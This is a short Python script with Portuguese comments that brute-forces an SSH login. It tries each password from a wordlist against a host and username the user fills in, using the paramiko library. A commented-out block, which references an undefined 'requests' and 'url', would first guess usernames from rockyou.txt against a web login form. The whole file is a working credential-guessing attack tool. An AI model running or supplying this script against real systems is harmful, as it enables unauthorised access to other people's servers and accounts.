import paramiko
client = paramiko.SSHClient() #Inicia o cliente SSH
client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #Configura para não utilizar chave privada SSH

hostname = "" #Insira o Hostname/IP

username = "" # Insira o username correto

#wordlistUser = "rockyou.txt" #Coloque o caminho da wordlist para ser utilizada nos usuários

wordlistPass = "" #Coloque o caminho da wordlist para ser utilizada nas senhas

#Username Bruteforce

# with open(wordlistUser, 'rb') as arquivo:  # Usando a worlist rockyou.txt
#     for linha_bytes in arquivo:
#         linha_str = linha_bytes.decode('utf-8')
#         dados = {'nome': linha_str.strip(), 'senha': 'senha'} # Focado em achar o user, senha não importa

#         response = requests.post(url, data=dados)
#         if "Invalid username" in response.text: #Checa se a resposta é válida
#             print("User Errado") # Prepare-se pro spam, caso não queira só comentar a linha
#         else:
#             print("O user correta é:")
#             print(linha_str.strip())
#             username = linha_str.strip() # Salva o username para a segunda parte do código
#             break

#Password Bruteforce

with open(wordlistPass, 'rb') as arquivo:
    for linha_bytes in arquivo:
        linha_str = linha_bytes.decode('utf-8')
        senha = linha_str.strip() 
        try: 
            client.connect(hostname=hostname, username=username, password=senha)
            print("Conexão estabelecida com sucesso!")
            print(f"A senha correta é: {senha}")
            break
        except paramiko.ssh_exception.AuthenticationException:
            continue
        except Exception as e:
              print(f"Ocorreu um erro: {e}")
    
    client.close()
